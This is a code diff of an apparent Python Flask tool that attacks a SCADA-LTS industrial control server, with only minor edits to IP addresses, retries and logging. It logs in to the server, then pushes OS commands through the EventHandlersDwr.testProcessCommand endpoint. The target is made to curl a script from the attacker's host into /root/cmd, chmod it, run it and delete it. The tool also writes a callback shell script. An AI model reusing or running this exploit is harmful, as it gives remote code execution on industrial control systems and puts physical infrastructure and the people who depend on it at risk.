@@ -9,7 +9,7 @@ import fcntl
 import struct
 
 PORT = 8080
-scada_url='http://10.0.0.21:8080'
+scada_url='http://172.16.10.100:8080'
 scanner = nmap.PortScanner()
 
 app = Flask(__name__)
@@ -24,13 +24,11 @@ def get_script(name):
 
 @app.route('/test')
 def test():
-    print("TEST")
+    print("TEST", flush=True)
     return "Test"
 
 def execute_cmd(cmd, scada_url, username, password):
-    print("GET res sent")
     res = requests.get(scada_url+f'/ScadaLTS/api/auth/{username}/{password}')
-    print("GET res obtained")
     jsession_cookie=res.headers['Set-Cookie']
 
     headers = {'Cookie': jsession_cookie,
@@ -38,29 +36,20 @@ def execute_cmd(cmd, scada_url, username, password):
 
     cmd = urllib.parse.quote_plus('command:'+cmd)
     
-    print("POST res sent")
     res = requests.post(scada_url+'/ScadaLTS/dwr/call/plaincall/EventHandlersDwr.testProcessCommand.dwr', 
     headers=headers,
     data=f"callCount=1&scriptSessionId=&c0-scriptName=EventHandlersDwr&c0-methodName=testProcessCommand&c0-param0={cmd}")
-    print("POST res obtained")
 
 def execute_script(scriptname, this_ip, username, password):
     global scada_url # temporary solution
-    print('Executing script (in 120s)')
-    time.sleep(120)
-
-    for i in range(30):
+    for i in range(5):
+        print(f"Tentativo {i}", flush=True)
         try:
-            print(f"Tentativo {i}")
-            time.sleep(20)
-            print("trying curl")
+            time.sleep(10)
             execute_cmd(f"curl {this_ip}:{PORT}/get_script/{scriptname} -o /root/cmd", scada_url, username, password)
-            print("trying chmod")
             execute_cmd("chmod 777 /root/cmd", scada_url, username, password)
-            print("trying exec")
             execute_cmd("/root/cmd", scada_url, username, password)
             time.sleep(5)
-            print("trying rm")
             execute_cmd("rm -f /root/cmd", scada_url, username, password)
             time.sleep(5)
         except Exception as e:
@@ -79,9 +68,8 @@ def get_ip_address(ifname):
     return ret
 
 if __name__ == "__main__":
-    ip = get_ip_address('eth0') # TODO Unreachable using real ip (not management)
+    ip = get_ip_address('eth0')
     print('ip: '+ip)
-    ip = '10.0.0.42'
     with open('scripts/fetch_and_send.sh', 'w') as f:
         f.write(f'#!/bin/sh\ncurl {ip}:{PORT}/test')
 
